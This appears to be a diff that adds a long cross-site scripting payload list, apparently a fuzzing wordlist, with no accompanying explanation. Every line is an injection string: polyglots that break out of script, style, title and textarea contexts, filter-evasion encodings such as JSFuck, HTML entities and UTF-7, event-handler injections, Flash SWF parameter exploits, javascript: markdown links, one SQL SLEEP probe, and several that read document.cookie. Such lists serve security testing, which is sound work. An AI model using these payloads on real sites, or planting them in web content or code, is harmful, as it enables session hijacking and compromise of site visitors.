+" onclick=alert()//<button ' onclick=alert()//> */ alert()//<img style="background-url=eval(onclick)" onclick=alert()>//>
+' onclick=alert();//'"></noscript></title></script></iframe></textarea><body onclick="alert()">
+"onclick=alert()//<svg/onclick=alert()//'onclick=alert()//<id onclick=alert()//";onclick=alert()//</style onclick=alert()//</script><svg '//" onclick=alert(1)//
+' onclick=alert();//'"></title></script></iframe></textarea><body onclick="alert()">
+'"onerror=alert(1);>javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+" onfocus=alert(1); " %0D %0A " onfocus=alert(1); " <a href="javascript://'/</title></style></textarea></script>--><p onclick=alert(1)>XXX %0D %0A %0D %0A # %0D %0A
+onmouseover=alert() " onmouseover=alert() */ onmouseover=alert() */ '<div onclick=alert()>'
+<p" %0A onclick=alert()//>
+<q/oncut=alert()</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/*
+</script>-->alert()"';alert();'<script>alert()</script> onclick=alert() */alert()/*
+<script>alert()</script>//<svg/onload=alert()>//<a class="" onclick=alert(1)//<button value=test 'onclick=alert()//>*/alert();/*
+//'/<@/></script></div></script>--><select\ %0D %0A */onclick=alert()><o>1<o>2')//"<!--
+//'/<@/></script></div></script>--><select */onclick=alert()><o>1<o>2')//"<!--
+<script>/* \n{{ %09 javascript://'/</title></style></textarea></script>--><p" %0D %0A onclick=alert()//>*/alert()/*}} \n*/</script>
+<script>onclick=alert()</script><div onclick=alert()>
+</script><svg onload='-/"/-alert(1)//'
+--></script></title></style>"/</textarea><a' %0A onclick=alert()//>*/alert()/*
+/*! SLEEP(1) /*/ onclick=alert(1)//<button value=Click_Me /*/*/ or' /*! or SLEEP(1) or /*/, onclick=alert(1)//> /*/*/'or" /*! or SLEEP(1) or /*/, onclick=alert(1)// /*/*/"  /*
+/*! SLEEP(1) /*/ onclick=alert(1)//<button value=Click_Me /*/*/ or' /*! SLEEP(1) or /*/, onclick=alert(1)//> /*/*/'or" /*! or SLEEP(1) or /*/, onclick=alert(1)// /*/*/"/**/ /*!/*/ // /*/*/
+"+'<svg/onclick=alert().source;;throw'atom';//>
+<svg onload=" %0D %0A %0D %0A void 'javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'; %0D %0A %0D %0A "></svg>
+<!--<textarea alt='jaVasCript:/*-/*`/*\`/*'/*"/**/(/*' */oNcliCk=alert(6) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(2)//>\x3e>xxx</textarea>;'#"><!-- <textarea alt='jaVasCript:/*-/*`/*\`/*'/*"/**/(/*' */oNcliCk=alert(6) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(2)//>\x3e>xxx</textarea-->
+/</title/'/</style/</script/--><p" %0A onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" %0A onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/* %0D %0A
+//'/</title></style></textarea></script>--><p" %0A onclick=alert()//>*/alert()/*
+//'/</title></style></textarea></script>--><p" %0D %0A onclick=alert()//>*/alert()/*
+var ()=\`\`;javascript://</title></style></textarea>--></script><a"//' %0D %0A onclick=alert()//>*/alert()/*
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx ' onclick=alert();//'"></title></script></iframe></textarea><body onclick="alert()">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+<iframe/onload=aaajavascipt:alert(1)>
+JavaScript://%250Dtop.confirm(1)//?1
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<svg><script href=data:,alert(1) 
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
+<div onpointerenter="alert(45)">MOVE HERE</div>
+<div onpointerleave="alert(45)">MOVE HERE</div>
+<div onpointermove="alert(45)">MOVE HERE</div>
+<div onpointerout="alert(45)">MOVE HERE</div>
+<div onpointerup="alert(45)">MOVE HERE</div>
+<body onload=alert(/XSS/.source)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video src=_ onloadstart="alert(1)">
+<details/open/ontoggle="alert`1`">
+<audio src onloadstart=alert(1)>
+<marquee onstart=alert(1)>
+<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
+<input type="hidden" accesskey="X" onclick="alert(1)">
+#"><img src=/ onerror=alert(2)>
+javascript:prompt(1)
+%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341
+&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+java%0ascript:alert(1)
+java%09script:alert(1)
+java%0dscript:alert(1)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+javascript://%0Aalert(1)
+javascript://anything%0D%0A%0D%0Awindow.alert(1)
+data:text/html,<script>alert(0)</script>
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
+<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+[a](javascript:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[a](javascript:window.onerror=alert;throw%201)
+flashmediaelement.swf?jsinitfunctio%gn=alert`1`
+flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
+ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
+swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
+plupload.flash.swf?%#target%g=alert&uid%g=XSS&
+video-js.swf?readyFunction=alert(1)
+player.swf?playerready=alert(document.cookie)
+player.swf?tracecall=alert(document.cookie)
+banner.swf?clickTAG=javascript:alert(1);//
+io.swf?yid=\"));}catch(e){alert(1);}//
+video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
+flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
+phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
+<sCrIpt>alert(1)</ScRipt>
+<script x>alert('XSS')<script y>
+eval('ale'+'rt(0)');
+Function("ale"+"rt(1)")();
+new Function`al\ert\`6\``;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+<img src='1' onerror='alert(0)' <
+String.fromCharCode(88,83,83)
+<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
+<script>window['alert'](document['domain'])</script>
+alert`1`
+setTimeout`alert\u0028document.domain\u0029`;
+<script>onerror=alert;throw 1337</script>
+<script>{onerror=alert}throw 1337</script>
+<script>throw onerror=alert,'some string',123,'haha'</script>
+<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+<object onafterscriptexecute=confirm(0)>
+<object onbeforescriptexecute=confirm(0)>
+<img src='1' onerror\x00=alert(0) />
+<img src='1' onerror\x0b=alert(0) />
+<img src='1' onerror/=alert(0) />
+<img/src='1'/onerror=alert(0)>
+<svgonload=alert(1)>
+"><svg/onload=confirm(1)>"@x.y
+<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
+location="http://google.com"
+document.location = "http://google.com"
+document.location.href="http://google.com"
+window.location.assign("http://google.com")
+window['location']['href']="http://google.com"
+window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+top['alert'](3)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
+[7].map(alert)
+[8].find(alert)
+[9].every(alert)
+[10].filter(alert)
+[11].findIndex(alert)
+[12].forEach(alert);
+prompt`${document.domain}`
+document.location='java\tscript:alert(1)'
+document.location='java\rscript:alert(1)'
+document.location='java\tscript:alert(1)'
+eval('ale'+'rt(0)');
+Function("ale"+"rt(1)")();
+new Function`al\ert\`6\``;
+constructor.constructor("aler"+"t(3)")();
+[].filter.constructor('ale'+'rt(4)')();
+top["al"+"ert"](5);
+top[8680439..toString(30)](7);
+top[/al/.source+/ert/.source](8);
+top['al\x65rt'](9);
+open('java'+'script:ale'+'rt(11)');
+location='javascript:ale'+'rt(12)';
+setTimeout`alert\u0028document.domain\u0029`;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+<svg onload=alert(1)//
+'te' * alert('*') * 'xt';
+'te' / alert('/') / 'xt';
+'te' % alert('%') % 'xt';
+'te' - alert('-') - 'xt';
+'te' + alert('+') + 'xt';
+'te' ^ alert('^') ^ 'xt';
+'te' > alert('>') > 'xt';
+'te' < alert('<') < 'xt';
+'te' == alert('==') == 'xt';
+'te' & alert('&') & 'xt';
+'te' , alert(',') , 'xt';
+'te' | alert('|') | 'xt';
+'te' ? alert('ifelsesh') : 'xt';
+'te' in alert('in') in 'xt';
+'te' instanceof alert('instanceof') instanceof 'xt';
+%26%2397;lert(1)
+&#97;&#108;&#101;&#114;&#116;
+></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
+javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
+𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
+𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
++(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
++𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
+ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
+<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
+javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
++ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
+%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
+\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
+%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
+<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
+<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
+<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
+<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
+script=document.createElement('script');
+window.frames[0].document.head.appendChild(script);
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<script ?/src="data:+,\u0061lert%281%29">/</script>
+<svg/OnLoad="`${prompt``}`">
+<svg/onload=%26nbsp;alert`bohdan`+
+1'"><img/src/onerror=.1|alert``>
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+</script><svg><script>alert(1)-%26apos%3B
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+<a href=javas&#99;ript:alert(1)>
+\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+</script><svg onload=alert(1)>
+<x contenteditable onblur=alert(1)>lose focus! 
+<x onclick=alert(1)>click this! 
+<x oncopy=alert(1)>copy this! 
+<x oncontextmenu=alert(1)>right click this! 
+<x oncut=alert(1)>copy this! 
+<x ondblclick=alert(1)>double click this! 
+<x ondrag=alert(1)>drag this! 
+<x contenteditable onfocus=alert(1)>focus this! 
+<x contenteditable oninput=alert(1)>input here! 
+<x contenteditable onkeydown=alert(1)>press any key! 
+<x contenteditable onkeypress=alert(1)>press any key! 
+<x contenteditable onkeyup=alert(1)>press any key! 
+<x onmousedown=alert(1)>click this! 
+<x onmousemove=alert(1)>hover this! 
+<x onmouseout=alert(1)>hover this! 
+<x onmouseover=alert(1)>hover this! 
+<x onmouseup=alert(1)>click this! 
+<x contenteditable onpaste=alert(1)>paste here!
+<script>alert(1)// 
